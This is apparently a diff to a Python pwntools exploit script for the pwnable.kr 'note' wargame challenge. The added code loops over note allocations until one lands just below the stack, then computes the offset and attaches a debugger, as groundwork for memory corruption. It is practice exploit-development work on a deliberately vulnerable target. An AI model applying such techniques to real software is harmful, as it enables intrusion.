@@ -6,7 +6,10 @@ host = 'pwnable.kr'
 host = '0'
 
 s = ssh(host='pwnable.kr', user='note', password='guest', port=2222)
-conn = s.remote(host, 9019)
+#conn = s.remote(host, 9019)
+conn = s.process('./note', aslr=False)
+
+stack_addr = 0xfffdd000
 
 def create_note():
 	conn.sendline('1')
@@ -58,14 +61,35 @@ def secret_menu(text):
 	conn.readuntil('pwn this\n')
 	conn.send(text)
 
-def main():
-	conn.readuntil('5. exit\n')
+def test():
 	num, addr = create_note()
 	write_note(num, 'test!')
 	a = read_note(num)
 	print a
+	delete_note(num)
 	return
 
+def get_note_ontop_of_stack():
+	iteraciones = 1
+	while True:
+		iteraciones += 1
+		num, addr = create_note()
+		addr = int(addr, 16)
+		if addr > 0xf7ffe000 and addr < stack_addr:
+			return num, addr, iteraciones
+		else:
+			iteraciones += 1
+			delete_note(num)
+
+def main():
+	conn.readuntil('5. exit\n')
+	num, addr, iteraciones = get_note_ontop_of_stack()
+	print 'nota encima del stack\naddr: {}'.format(hex(addr))
+	print str(iteraciones)
+	distancia = stack_addr - addr
+	gdb.attach(conn)
+	input()
+	input()
 
 if __name__ == '__main__':
 	try:
